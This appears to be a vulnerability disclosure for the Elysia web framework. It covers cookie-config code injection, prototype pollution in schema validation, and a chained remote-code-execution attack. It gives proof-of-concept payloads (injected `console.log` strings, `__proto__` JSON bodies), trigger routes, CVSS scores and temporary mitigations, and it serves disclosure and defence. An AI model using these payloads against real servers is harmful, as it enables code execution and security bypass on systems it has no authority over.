# Elysia cookie injection, prototype pollution, and RCE

## Cookie config ACE: ./cookie-injection.ts
Arbitrary code execution from cookie config. If dynamic cookies are enabled
(ie there exists a schema for cookies), the cookie config is injected into the compiled
route.

Availability of this exploit is generally low, as it requires write access to either
the Elysia app's source code (in which case the vulnerability is meaningless) or
write access to the cookie config (perhaps where it is assumed to be provisioned by the environment).

Preconditions:
- `aot` enabled (default)
- `cookie` schema passed to route
- Cookie config controllable

POC:
```sh
COOKIE_DOMAIN="' + console.log('pwned') + '" bun run cookie-injection.ts
```

Payload triggers on a request to a handler with `cookie` schema. (`GET /` for this POC)

### CVSS 4.0: 7.5 / High (estimation)
CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N

### Temporary mitigation
- Ensure no cookie configuration is dynamically set:
```js
const app = new Elysia({
	cookie: {
        // !! BAD !!
		domain: process.env.COOKIE_DOMAIN || "localhost",
	},
});
```

## Prototype pollution in schema validation: ./proto-pollution.ts
Prototype pollution vulnerability in `mergeDeep` after merging results of two
standard schema validations with the same key. Due to the ordering of merging,
there must be an `any` type that is set as a `standalone` guard, to allow for the
`__proto__` prop to be merged.

Payload (`POST /`):
```json
{
  "data": {
    "messageId": "pollute-me",
    "__proto__": {
      "foo": "bar"
    }
  }
}
```

Response:
```json
{
  "body": {
    "data": {
      "messageId": "pollute-me"
    }
  },
  "win": "bar"
}
```

### CVSS 4.0: 9.1 / Critical
CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N

- Can be used to bypass authentication/server side security controls

### Temporary mitigation
- Do not use `any` types in validators and ensure `__proto__` keys do not pass validation

## (chain) Prototype pollution leading to RCE through cookie config: ./rce.ts
Resulting from the previous two vulnerabilities, prototype pollution can be used
to inject arbitrary code into a compiled route code. This can lead to full RCE
from a vulnerable route.

Payload (`POST /`):
```json
{
  "data": {
    "messageId": "pollute-me",
    "__proto__": {
      "cookie": {},
      "domain": "' + console.log('pwned') + '"
    }
  }
}
```
- The `cookie` key ensures that `hasCookie` in `composeHandler` is true (`!!validator.cookie` will be true)
- `domain` key as before

Trigger: `GET /cold-route`
- The triggering route must not have been compiled before the payload is sent

### Temporary mitigation
- Set `precompile: true` in Elysia settings
